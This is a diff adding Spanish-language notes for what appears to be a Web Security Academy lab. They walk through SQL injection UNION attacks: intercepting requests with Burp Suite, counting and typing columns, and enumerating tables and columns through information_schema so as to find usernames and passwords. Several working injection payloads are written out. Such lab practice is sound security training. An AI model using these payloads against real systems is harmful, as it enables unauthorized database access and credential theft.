@@ -85,3 +85,72 @@ Este query utiliza la función @@version para obtener la versión de la base de 
 
 RESPUESTA: '+UNION+SELECT+@@version,NULL--+  ==> 8.0.32-0ubuntu0.20.04.2
 
+
+
+
+			--> Lab: SQL injection attack, listing the database contents on non-Oracle databases
+			
+-> Reconocimiento & Objectivo :
+
+Vulnerabilidad "SQL injection" en el "product category offer" 
+Podemos usar Union attack, para obtener data desde las otras tablas.
+La aplicacion tiene un "login function" y una base de datos que contiene una tabla con los nombres de usuario y contrasenas. 
+
+Para RESOLVER el lab: Necesitamos saber cual es el nombre de la tabla que contiene los "usernames y passwords" y el nombre de las columnas que contiene esa data y asi poder obtener la info de todos los usuarios.
+Luego necesiamos hacer "Log in" como Administrador.  
+
+
+-> ejecutando el ataque a la maquina:
+
+1) con burp suite y fox proyx vamos a la URL: https://0aa300ce0466742f819857e300fb0063.web-security-academy.net/
+
+2) encendemos el capturador de burp suite app y fox proxy en el navegador.  
+
+3) Click en cualquier "category" e.g. "Gifts" (damos click en forward en burpsuite hasta finalizar la carga de la pagina)
+
+4) en burp suite > proxy > http history > click en la peticion que contenga la url: https://0aa300ce0466742f819857e300fb0063.web-security-academy.net/filter?category=Gifts , click derecho y "send to repeter" 
+
+5) en el repetir en la primera linea esta: GET /filter?category=Gifts HTTP/2 cambiar la url por: GET /filter?category=' HTTP/2 ( si devuelve un error 500, es probable que la pagina sea vulnerable a SQL injection )
+
+6) Apesar de intentar ver cuantas columanas retornaba la base datos usando los comandos:
+'+UNION+SELECT+NULL,NULL--+
+
+Esto significa que la respuesta recibida desde el servidor retorna 2 columnas. 
+
+7) Determinando que el "type" de las columnas retornadas: 
+
+Despues de varias pruebas se reconoce que las 2 bases de datos son de tipo "string"
+'+UNION+SELECT+'A','A'--+  (2 columnas de tipo string)
+
+8) Listando el nombre de las tablas de la base de datos: (Se sabe que es una Non-Oracle DB, por lo tanto no probaremos con esos comandos de Oracle)
+
+'+UNION+SELECT+*+FROM+NULL,information_schema.tables+--+
+'+UNION+SELECT+*+FROM+NULL,information_schema.tables+--+
+'+UNION+SELECT+table_name,null+FROM+information_schema.tables+WHERE+table_schema=database()--+
+'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+WHERE+table_schema=database()--+
+
+- Nada de eso funciono excepto este comando: 
+
+'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables+--+
+
+y tambien esto:
+
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+--+
+
+- Con ambos se optinen la lista de las tablas en la base de datos, ahora procedemos a
+buscar las columnas que contienen "username, passwords" que es la data para hacer log in como 
+administrador. 
+
+'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='table_name_here'--+
+
+Con esto podemos ver las columnas contenidas en cada tabla. 
+
+
+
+
+
+
+
+
+
+
